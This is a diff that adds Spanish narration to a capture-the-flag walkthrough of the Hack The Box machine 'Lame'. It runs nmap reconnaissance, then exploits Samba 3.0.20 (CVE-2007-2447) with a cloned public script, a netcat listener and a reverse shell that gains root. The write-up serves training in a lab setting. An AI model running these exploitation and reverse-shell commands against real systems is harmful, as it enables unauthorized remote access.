@@ -21,9 +21,9 @@ layout:
 
 ***
 
+## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>
 
-
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Lame**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.3 -oG allPorts
@@ -57,7 +57,7 @@ Nmap done: 1 IP address (1 host up) scanned in 101.73 seconds
 
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -70,7 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 101.73 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado obtenido vemos servicios como FTP, SSH y SMB.
 
 ```bash
 ❯ nmap -sCV -p21,22,139,445,3632 10.10.10.3 -A -oN targeted -oX targetedXML
@@ -131,9 +131,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 57.38 seconds
 ```
 
-
-
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -142,9 +140,15 @@ Nmap done: 1 IP address (1 host up) scanned in 57.38 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (265).png" alt=""><figcaption></figcaption></figure>
+
+## Intrusion and Privilege Escalation
+
+### Samba 3.0.20 < 3.0.25rc3 - Username Map Script (CVE-2007-2447)
+
+En el escaneo inicial de **Nmap** nos encontramos que había un servidor Samba de la versión `smbd 3.0.20`, nos pareció algo inusual que tuviera una versión tan antigua. Decidimos buscar por Internet posibles vulnerabilidades de esta versión y nos encontramos con el siguiente `CVE-2007-2447`.
 
 {% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2007-2447" %}
 
@@ -152,11 +156,11 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 La funcionalidad MS-RPC en mbd en Samba 3.0.0 hasta la 3.0.25rc3 permite a atacantes remotos ejecutar comandos de su elección a través del intérprete de comandos (shell) de metacaracteres afectando a la (1) función SamrChangePassword, cuando la opción "secuencia de comandos del mapa del nombre de usuario" smb.conf está activada, y permite a usuarios remotos validados ejecutar comandos a través del intérprete de comandos (shell) de metacaracteres afectando a otras funciones MS-RPC en la (2)impresora remota y (3)gestión de ficheros compartidos.
 {% endhint %}
 
-
-
-
+Nos descargaremos el siguiente proyecto de GitHub para realizar la explotación. Instalaremos los requisitos necesarios para utilizar la herramienta.
 
 {% embed url="https://github.com/amriunix/CVE-2007-2447" %}
+&#x20;
+{% endembed %}
 
 ```bash
 ❯ git clone https://github.com/amriunix/CVE-2007-2447; cd CVE-2007-2447
@@ -171,16 +175,14 @@ Resolviendo deltas: 100% (3/3), listo.
 ❯ pip install --user pysmb
 ```
 
-
+En una nueva terminal nos pondremos en escucha para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
-
-
+Ejecutaremos el exploit indicándole el target (máquina vícitma), el puerto donde tiene levantado este servicio vulnerable y nuestra direccióin y  puerto para recibir la Reverse Shell.
 
 ```bash
 ❯ python2 usermap_script.py 10.10.10.3 445 10.10.16.5 443
@@ -189,7 +191,7 @@ listening on [any] 443 ...
 [+] Payload was sent - check netcat !
 ```
 
-
+Comprobamos que hemos logrado obtener acceso al sistema como usuario `root`. Logramos también visualizar las flags de **user.txt** y **root.txt**.
 
 ```bash
 ❯ nc -nlvp 443
